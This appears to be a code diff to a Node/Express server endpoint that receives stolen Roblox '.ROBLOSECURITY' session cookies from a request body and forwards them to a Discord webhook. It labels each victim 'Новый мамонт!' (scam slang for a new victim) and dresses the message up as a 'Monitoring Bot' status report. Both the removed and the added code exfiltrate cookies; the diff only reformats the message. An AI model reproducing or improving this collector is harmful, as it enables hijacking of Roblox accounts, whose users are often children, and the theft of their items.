@@ -18,23 +18,34 @@ app.post('/send', async (req, res) => {
         const fieldsArray = [];
         let index = 0;
         let embds = []
-        // Перебираем ключ-значение из тела запроса
+        let embed = {
+            title: "Новый мамонт!",
+            description: "All systems operational",
+            color: 5763719, // Green
+            fields: [
+              
+            ],
+            footer: {
+              text: "Monitoring Bot"
+            },
+            timestamp: new Date().toISOString()
+        };
         for (const key in reqBody) {
             if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
                 index++;
-                const discordPayload = {
-                    content: `Новый мамонт! №${index} Куки: ${key}`,
-                    attachments: []
-                };
-
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(discordPayload)
-                });
+                //name: "Memory",
+                //value: "4.2 GB / 16 GB",
+                //inline: true
+                embed.fields.push({name: ".ROBLOSECURITY", value: key, inline: true})
             }
         }
-
+        const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ embeds: [embed] })
+        });
         // Формируем правильную структуру для Discord
         res.status(200).json({ success: true });
 });
